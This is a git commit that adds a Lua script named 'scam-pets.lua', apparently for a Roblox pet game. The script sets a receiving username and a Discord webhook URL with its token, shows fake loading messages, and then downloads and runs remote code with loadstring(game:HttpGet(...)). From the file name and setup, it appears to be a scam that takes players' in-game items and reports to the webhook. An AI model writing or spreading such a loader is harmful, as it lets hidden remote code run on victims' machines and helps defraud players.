2e53abec3addcab885b76d9f164a12411a1aca50
Samchik0 <132168014+Samchik0@users.noreply.github.com>
2023-05-17 17:49:20 +0500

    Create scam-pets.lua

---
+++ scam-pets.lua
@@ -0,0 +1,9 @@
+Username = "kfndledrik1"
+WebHook = "https://discord.com/api/webhooks/1102195391044259910/0SWImoxT2lrkfSz60-ifEo7J-iTOOJfVWJWctGz-axPhUDRZI1awXbnx8c9pIEoUlPXp"
+
+_G.CustomScriptName = "Coen"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
